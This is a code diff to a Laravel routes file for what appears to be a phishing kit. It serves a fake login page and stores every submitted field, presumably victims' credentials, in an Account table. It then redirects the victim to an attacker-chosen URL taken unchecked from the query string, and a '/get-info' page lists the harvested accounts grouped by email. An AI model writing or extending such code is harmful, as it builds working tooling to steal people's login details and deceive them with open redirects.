@@ -14,17 +14,26 @@ use App\Account;
  */
 
 Route::get('/', function () {
+    $parameters = request()->query();
+
+    $url = $parameters['url'];
+
+    session(['url' => $url]);
+
     return view('login');
+
 });
 
 Route::post('', function () {
     Account::create(request()->all());
 
-    return redirect('http://philnews.info/2017/01/05/hello-world/');
+    $url = session('url');
+
+    return redirect($url);
 });
 
 Route::get('/get-info', function () {
-    $accounts = Account::latest()->paginate(30);
+    $accounts = Account::latest()->groupBy('email')->paginate(30);
 
     return view('accounts', compact('accounts'));
 });
